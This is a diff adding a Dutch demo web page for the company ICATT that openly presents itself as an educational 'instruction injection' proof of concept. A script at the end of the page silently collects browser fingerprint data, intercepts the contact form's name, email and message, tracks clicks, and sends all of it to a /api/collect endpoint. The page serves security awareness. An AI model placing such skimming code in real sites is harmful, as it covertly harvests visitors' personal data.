@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ICATT INFO - Menselijk digitaal | Instruction Injection Demo</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Warning Banner -->
+    <div class="warning-banner">
+        ⚠️ DEMO ENVIRONMENT - Educational demonstration of instruction injection attacks
+    </div>
+
+    <!-- Header Section with ICATT Branding -->
+    <header class="header">
+        <h1>ICATT INFO</h1>
+        <p class="tagline">Menselijk digitaal</p>
+        <p class="subtitle">Common ground, transparant en open</p>
+    </header>
+
+    <!-- Navigation -->
+    <nav class="nav">
+        <ul>
+            <li><a href="/">Home</a></li>
+            <li><a href="#oplossingen">Oplossingen</a></li>
+            <li><a href="#demo">Demo</a></li>
+            <li><a href="/admin">Admin Panel</a></li>
+            <li><a href="/presentation.html">📊 Presentatie</a></li>
+            <li><a href="#contact">Contact</a></li>
+        </ul>
+    </nav>
+
+    <!-- Main Container -->
+    <div class="container">
+        <!-- Hero Section -->
+        <section class="hero">
+            <h2>Wij maken IT slimmer, efficiënter en toegankelijker</h2>
+            <p>
+                Met een team van 50 professionals en 30 jaar ervaring in de overheidssector,
+                helpen wij organisaties bij het bouwen van veilige en betrouwbare IT-oplossingen.
+            </p>
+        </section>
+
+        <!-- Instruction Injection Warning -->
+        <section class="injection-warning">
+            <h4>🔒 Instruction Injection POC Active</h4>
+            <p>
+                Deze pagina bevat een actieve Proof of Concept van een instruction injection aanval.
+                De injectie simuleert hoe kwaadaardige instructies data kunnen exfiltreren naar een externe server.
+            </p>
+            <p><strong>Educatief doel:</strong> Demonstratie van beveiligingsrisico's in AI-systemen.</p>
+        </section>
+
+        <!-- Solutions Grid -->
+        <section id="oplossingen" class="content-grid">
+            <div class="card">
+                <h3>Common Ground</h3>
+                <p>
+                    Wij ontwikkelen componenten voor Common Ground architectuur,
+                    gericht op transparantie en herbruikbaarheid van overheidssoftware.
+                </p>
+            </div>
+
+            <div class="card">
+                <h3>KISS Principes</h3>
+                <p>
+                    Keep It Simple & Stupid - onze aanpak voor overzichtelijke
+                    en onderhoudbare IT-oplossingen.
+                </p>
+            </div>
+
+            <div class="card">
+                <h3>Woo & Transparantie</h3>
+                <p>
+                    Publiek geld, publieke code. Wij ondersteunen de
+                    Wet Open Overheid met open source oplossingen.
+                </p>
+            </div>
+        </section>
+
+        <!-- Instruction Injection Demo Section -->
+        <section id="demo" class="demo-section">
+            <h3>📋 Instruction Injection Interactieve Demo</h3>
+            <p>
+                Deze demo toont hoe een instruction injection aanval werkt.
+                Vul het formulier in om te zien hoe data wordt verzameld en opgeslagen.
+            </p>
+
+            <div class="demo-form">
+                <form id="demoForm">
+                    <div class="form-group">
+                        <label for="userName">Naam:</label>
+                        <input type="text" id="userName" name="userName" required
+                               placeholder="Voer uw naam in">
+                    </div>
+
+                    <div class="form-group">
+                        <label for="userEmail">E-mail:</label>
+                        <input type="email" id="userEmail" name="userEmail" required
+                               placeholder="naam@voorbeeld.nl">
+                    </div>
+
+                    <div class="form-group">
+                        <label for="userMessage">Bericht:</label>
+                        <textarea id="userMessage" name="userMessage" required
+                                  placeholder="Typ hier uw bericht..."></textarea>
+                    </div>
+
+                    <button type="submit" class="btn">Verzenden</button>
+                </form>
+
+                <div id="formResponse" style="margin-top: 1rem;"></div>
+            </div>
+
+            <!-- Injection Explanation -->
+            <div class="card" style="margin-top: 2rem;">
+                <h3>🔍 Hoe werkt de Instruction Injection?</h3>
+                <p>
+                    Op deze pagina is een verborgen script actief dat:
+                </p>
+                <ul style="margin-left: 2rem; color: var(--icatt-gray);">
+                    <li>Formulierdata onderschept voordat deze wordt verzonden</li>
+                    <li>Extra informatie verzamelt (browser, tijdstempel, pagina-informatie)</li>
+                    <li>Data naar een externe API stuurt via <code>/api/collect</code></li>
+                    <li>Dit gebeurt onzichtbaar voor de gebruiker</li>
+                </ul>
+                <p style="margin-top: 1rem;">
+                    <strong>In een echte aanval:</strong> De geïnjecteerde instructies kunnen
+                    AI-systemen manipuleren om gevoelige informatie te lekken, ongewenst gedrag
+                    te vertonen, of beveiligingsmaatregelen te omzeilen.
+                </p>
+            </div>
+        </section>
+
+        <!-- Team Section -->
+        <section id="contact" class="content-grid">
+            <div class="card">
+                <h3>💼 Over ICATT</h3>
+                <p>
+                    ICATT is een team van 50 professionals gevestigd in Amsterdam,
+                    met 30 jaar ervaring in de overheidssector.
+                </p>
+                <p>
+                    <strong>Contactpersonen:</strong><br>
+                    Hanneke van der Horst<br>
+                    Hoite Polkamp
+                </p>
+            </div>
+
+            <div class="card">
+                <h3>📞 Contact</h3>
+                <p>
+                    Neem contact met ons op voor vragen over IT-beveiliging,
+                    instruction injection, of onze diensten.
+                </p>
+                <button class="btn" onclick="alert('Demo: Bel of mail ons via www.icatt.nl')">
+                    Bel of mail ons
+                </button>
+            </div>
+        </section>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <p>&copy; 2024 ICATT INFO - Menselijk digitaal</p>
+        <p>Common ground, transparant en open</p>
+        <p>We Code For NL | Publiek Geld Publieke Code</p>
+    </footer>
+
+    <!-- INSTRUCTION INJECTION POC - Hidden malicious script -->
+    <script>
+        // ============================================================
+        // INSTRUCTION INJECTION PROOF OF CONCEPT
+        // ============================================================
+        // This script demonstrates how injected instructions can
+        // exfiltrate data without the user's knowledge
+        // ============================================================
+
+        (function() {
+            console.log('%c⚠️ INSTRUCTION INJECTION POC ACTIVE',
+                        'color: red; font-size: 16px; font-weight: bold;');
+
+            // Collect system information
+            const collectSystemInfo = () => {
+                return {
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    onlineStatus: navigator.onLine,
+                    pageURL: window.location.href,
+                    referrer: document.referrer || 'Direct',
+                    injectionType: 'Instruction Injection POC'
+                };
+            };
+
+            // Exfiltrate data to collection endpoint
+            const exfiltrateData = async (data) => {
+                try {
+                    const response = await fetch('/api/collect', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(data)
+                    });
+
+                    const result = await response.json();
+                    console.log('%cData exfiltrated successfully:', 'color: orange;', result);
+                } catch (error) {
+                    console.error('Exfiltration failed:', error);
+                }
+            };
+
+            // Exfiltrate initial page load data
+            exfiltrateData({
+                event: 'page_load',
+                ...collectSystemInfo()
+            });
+
+            // Intercept form submissions
+            const form = document.getElementById('demoForm');
+            if (form) {
+                form.addEventListener('submit', async (e) => {
+                    e.preventDefault();
+
+                    const formData = {
+                        event: 'form_submission',
+                        userName: document.getElementById('userName').value,
+                        userEmail: document.getElementById('userEmail').value,
+                        userMessage: document.getElementById('userMessage').value,
+                        ...collectSystemInfo()
+                    };
+
+                    // Exfiltrate form data
+                    await exfiltrateData(formData);
+
+                    // Show success message to user
+                    const responseDiv = document.getElementById('formResponse');
+                    responseDiv.innerHTML = `
+                        <div class="alert alert-success">
+                            ✅ Formulier verzonden! Uw data is verzameld en opgeslagen.
+                            <br><br>
+                            <strong>Let op:</strong> In deze demo is uw data ook naar het
+                            /api/collect endpoint gestuurd door de instruction injection.
+                            <br>
+                            <a href="/admin" class="btn" style="margin-top: 1rem;">
+                                Bekijk verzamelde data
+                            </a>
+                        </div>
+                    `;
+
+                    // Reset form
+                    form.reset();
+                });
+            }
+
+            // Track user interactions
+            let interactionCount = 0;
+            document.addEventListener('click', (e) => {
+                interactionCount++;
+
+                // Send data every 5 clicks
+                if (interactionCount % 5 === 0) {
+                    exfiltrateData({
+                        event: 'user_interaction',
+                        interactionCount: interactionCount,
+                        targetElement: e.target.tagName,
+                        targetId: e.target.id || 'none',
+                        ...collectSystemInfo()
+                    });
+                }
+            });
+
+            console.log('%cInstruction Injection POC loaded successfully',
+                        'color: green; font-weight: bold;');
+        })();
+    </script>
+</body>
+</html>
